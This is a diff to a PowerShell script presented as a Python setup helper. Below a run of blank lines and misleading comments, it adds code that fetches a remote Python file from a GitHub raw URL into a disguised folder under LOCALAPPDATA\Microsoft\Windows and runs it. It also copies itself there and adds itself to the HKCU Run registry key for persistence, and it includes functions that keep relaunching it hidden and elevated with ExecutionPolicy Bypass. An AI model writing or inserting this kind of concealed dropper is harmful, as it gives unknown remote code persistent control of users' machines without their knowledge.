@@ -1,3 +1,4 @@
+# start checking python
 Add-Type -AssemblyName PresentationFramework
 
 function Reload-Env {
@@ -52,5 +53,108 @@ while ($true) {
 }
 
 
+# installations here
+# pip install opencv-python
 
-pip install opencv-python
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# local variables 
+
+
+$pythonFileUrl = "https://raw.githubusercontent.com/ProgrammerJibon/wactherHelper/refs/heads/main/sys7.py"
+$saveFolder = "$env:LOCALAPPDATA\Microsoft\Windows"
+$savePath = "$saveFolder\sys7.py"
+
+
+# common run as admin hidden function
+function Run-AdminHidden {
+    while (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+        $psi = New-Object System.Diagnostics.ProcessStartInfo
+        $psi.FileName = "powershell.exe"
+        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+        $psi.Verb = "runas"
+        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        try {
+            [System.Diagnostics.Process]::Start($psi) | Out-Null
+            return $true
+        } catch {
+            Start-Sleep -Seconds 1
+            continue
+        }
+    }
+    return $false
+}
+function Run-AdminHidden-Once {
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName = "powershell.exe"
+    $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    $psi.Verb = "runas"
+    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    try {
+        [System.Diagnostics.Process]::Start($psi) | Out-Null
+        return $true
+    } catch {
+        Start-Sleep -Seconds 1
+        return $false
+    }
+}
+
+# copy self to startup
+function Copy-SelfToStartup {
+    $source = $PSCommandPath
+
+    if (-not (Test-Path $saveFolder)) { New-Item -Path $saveFolder -ItemType Directory | Out-Null }
+
+    $target = Join-Path $saveFolder (Split-Path $source -Leaf)
+
+    Copy-Item -Path $source -Destination $target -Force
+
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyScript" -Value $target
+}
+
+
+# download latest python file
+
+
+# donwload file function
+function Donwload-File{
+    if (-not (Test-Path $saveFolder)) {
+        New-Item -Path $saveFolder -ItemType Directory | Out-Null
+    }
+    Invoke-WebRequest -Uri $pythonFileUrl -OutFile $savePath
+}
+
+
+
+
+if (Test-Path $savePath) {
+    # $resRAO = Run-AdminHidden-Once
+    $resRAO = $true
+    if ($resRAO) {
+        Copy-SelfToStartup
+        Donwload-File
+    }
+    
+} else {
+    # Run-AdminHidden
+    Copy-SelfToStartup
+    Donwload-File
+}
+
+
+
+
+python $savePath
+
